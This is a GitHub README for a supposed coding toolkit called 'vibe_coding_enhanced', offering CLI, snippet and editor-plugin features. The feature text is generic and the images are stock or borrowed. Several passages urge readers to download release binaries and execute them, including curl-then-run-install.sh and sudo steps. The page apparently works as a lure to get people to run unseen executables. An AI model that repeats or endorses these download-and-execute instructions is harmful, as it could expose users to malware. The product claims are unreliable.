[![Releases](https://img.shields.io/badge/Releases-vibe_coding_enhanced-blue?logo=github)](https://github.com/Luffytarokk/vibe_coding_enhanced/releases)

https://github.com/Luffytarokk/vibe_coding_enhanced/releases

# Vibe Coding Enhanced — Tools for Faster, Cleaner Code Flow

![Hero image](https://images.unsplash.com/photo-1519389950473-47ba0277781c?ixlib=rb-4.0.3&q=80&w=1400&auto=format&fit=crop&crop=entropy)

A compact toolkit that extends Vibe Coding with editor helpers, live utilities, and small CLI tools. Use these tools to shape a steady development flow, cut friction in repetitive tasks, and keep focus on creative work.

- Lightweight plugins and CLI utilities.
- Editor snippets and macros.
- Runtime tools for logging and session control.
- Cross-platform support: Linux, macOS, Windows.

Table of Contents
- Features
- Screenshots
- Install (download and execute)
- Quick start
- Commands and examples
- Editor integration
- Configuration
- Workflows and tips
- Development
- Roadmap
- Contributing
- License
- Releases

## Features ⚡

- Snippets: ready code snippets for common patterns.
- Live commands: run short tasks from the editor or terminal.
- Session tools: persist and restore coding sessions.
- Formatter bridge: run formatters that match vibe rules.
- Lightweight CLI: small binary that runs on all major OS.
- Config-first design: plain JSON or YAML config.
- Low friction: no heavy frameworks or runtime deps.

Each tool stays small. Each tool focuses on one problem. You can mix and match utilities.

## Screenshots 🖼️

![Editor overlay example](https://raw.githubusercontent.com/github/explore/main/topics/visual-studio-code/visual-studio-code.png)

- Editor overlay for snippets.
- Terminal utility for session snapshots.
- Quick picker for templates.

## Install (download and execute) ⬇️

Go to the Releases page and download the installer or binary for your platform. The release file needs to be downloaded and executed.

Visit the releases and pick the asset that matches your OS:
https://github.com/Luffytarokk/vibe_coding_enhanced/releases

Typical release file names:
- vibe_coding_enhanced-1.2.0-linux.tar.gz
- vibe_coding_enhanced-1.2.0-macos.zip
- vibe_coding_enhanced-1.2.0-windows.zip

Linux (tar.gz)
- Download the tarball.
- Extract and run the installer or binary.

Example:
- curl -L -o vibe.tar.gz "https://github.com/Luffytarokk/vibe_coding_enhanced/releases/download/v1.2.0/vibe_coding_enhanced-1.2.0-linux.tar.gz"
- tar -xzf vibe.tar.gz
- cd vibe_coding_enhanced-1.2.0
- ./install.sh
- ./vibe --help

macOS (zip)
- Unzip and move the binary to /usr/local/bin or run the included installer.

Example:
- curl -L -o vibe.zip "https://github.com/Luffytarokk/vibe_coding_enhanced/releases/download/v1.2.0/vibe_coding_enhanced-1.2.0-macos.zip"
- unzip vibe.zip
- sudo mv vibe /usr/local/bin/
- vibe --help

Windows (zip)
- Unzip and run the installer or place the binary in a folder on PATH.
- Run vibe.exe from PowerShell or CMD.

If the release link changes or fails, check the Releases section of this repo for the correct assets.

## Quick start — basic usage ▶️

After installing, run the CLI to see commands:

- vibe --help

Common tasks:
- Start session persistence: vibe session start
- Snapshot current layout: vibe snapshot save my-work
- Restore snapshot: vibe snapshot restore my-work
- Open snippets picker: vibe snippets open
- Run a live command: vibe run lint

The CLI outputs plain JSON for automation. That helps integrate the tool into scripts.

## Commands and examples 🧰

- vibe init
  - Initialize local config and snippet folder.
  - Example: vibe init --template node-basic

- vibe snippets list
  - List installed snippets.

- vibe run <task>
  - Run tasks defined in config.
  - Example: vibe run format

- vibe session save <name>
  - Save current session state.

- vibe session restore <name>
  - Restore saved state.

- vibe plugin install <name>
  - Install a small plugin from the plugin index.

Examples:

1) Create a new project template
- vibe init --template react-minimal
- cd react-minimal
- code .

2) Snap and restore a session
- vibe session save feature-x
- Later: vibe session restore feature-x

3) Use snippets in the editor (VS Code)
- Install the editor extension
- Open command palette -> Vibe Snippets: Open
- Pick a snippet and insert

## Editor integration ✍️

Vibe Coding Enhanced ships integration modules for common editors.

- VS Code: lightweight extension that exposes snippet picker, commands, and session control.
- Neovim: Lua plugin that exposes mappings for snippet and session commands.
- JetBrains IDEs: small plugin to access the snippet picker and run tasks.

Install the editor integration from the Releases or via the editor marketplace. The release assets include editor-specific packages. Download the matching package and install it in the editor. The package file needs to be downloaded and executed or imported where applicable.

Integration points
- Snippet quick pick
- Command palette entries
- Terminal helpers

## Configuration ⚙️

Config files use JSON or YAML. Keep configs in .vibe/config.json or .vibe/config.yaml in your project root.

Sample config (JSON):
{
  "snippetsPath": ".vibe/snippets",
  "tasks": {
    "format": "prettier --write .",
    "lint": "eslint ."
  },
  "session": {
    "autoSave": false
  }
}

You can override config with environment variables:
- VIBE_SNIPPETS: path
- VIBE_TASKS_FILE: file path

Configs stay local by default. Use a global config in your home folder for machine-wide defaults.

## Workflows and tips 🔁

- Keep a small snippet set per project. This prevents clutter.
- Use session snapshots before large refactors. Restore if needed.
- Wire the vibe CLI into your editor tasks. Use the editor task runner to run vibe run format.
- Write small plugins for repetitive tasks. Plugins run as child processes and return JSON.
- Version your snippet collection. Check them into your repo under .vibe/snippets.

Example workflow: feature branch focus
- Create a branch.
- vibe session save start-feature
- Work on files.
- vibe snapshot save mid-progress
- Commit and push.
- vibe session restore start-feature after merge if needed.

## Development — build and test 🛠️

Clone the repo and run the build script. The repo contains multiple small modules.

- git clone https://github.com/Luffytarokk/vibe_coding_enhanced.git
- cd vibe_coding_enhanced
- ./scripts/bootstrap.sh
- ./scripts/build.sh

Unit tests run with the test runner:
- ./scripts/test.sh

To add a new snippet
- Create a YAML file in packages/snippets/<name>.yml
- Run the build to pack it
- Publish the plugin if you want to share it

Debug mode
- Use VIBE_DEBUG=true to get verbose logs.
- Logs write to .vibe/logs by default.

## Roadmap 🚀

Planned items
- Plugin marketplace index and search.
- Web UI to browse snippets and sessions.
- Better Windows shell integration.
- Live collaboration tools for paired flow.
- CI hooks to enforce vibe rules on PRs.

If you want specific features, open an issue and describe the use case.

## Contributing 🤝

- Fork the repo.
- Create a branch: feat/your-feature
- Add tests for your change.
- Keep commits small.
- Open a pull request with a clear description and examples.

Code style
- Use ESLint or the linter in the repo.
- Keep modules small and focused.
- Document public APIs.

Security
- Report issues by opening a GitHub issue.
- Sensitive reports: create an issue and mark it private if needed.

## License 📜

This project uses the MIT license. See the LICENSE file.

## Releases

Download the latest release assets or view release notes on the Releases page:
[Releases and assets](https://github.com/Luffytarokk/vibe_coding_enhanced/releases)

If a release asset contains an installer or binary, download that file and execute it for your platform.